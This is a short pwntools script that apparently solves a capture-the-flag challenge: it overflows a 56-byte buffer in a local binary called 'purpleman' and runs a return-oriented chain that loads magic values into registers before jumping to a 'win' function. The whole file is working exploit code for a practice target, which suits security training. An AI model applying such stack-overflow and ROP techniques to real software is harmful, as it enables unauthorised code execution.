from pwn import *
context.arch = 'amd64'

binary = ELF('./purpleman')
p = process(binary.path)
p = remote("localhost", 7420)

# p: process = gdb.debug(binary.path,'''
#     b process
#     c
# ''')

win_addr = 0x40121d

# ROP Gadgets
pop_rdi = 0x4011fe  # pop rdi; ret
pop_rsi = 0x40120b  # pop rsi; ret
pop_rdx = 0x401218  # pop rdx; ret

rc = ROP(binary)

rc.raw([
    pop_rdi, 0xdeadbeef,
    pop_rsi, 0xcafebabe,
    pop_rdx, 0xc0defeed,
    win_addr
])

print(rc.dump())

# Payload
offset = 56

payload = flat(
    b'A' * offset,
    rc.chain()
)

p.sendline(payload)
p.interactive()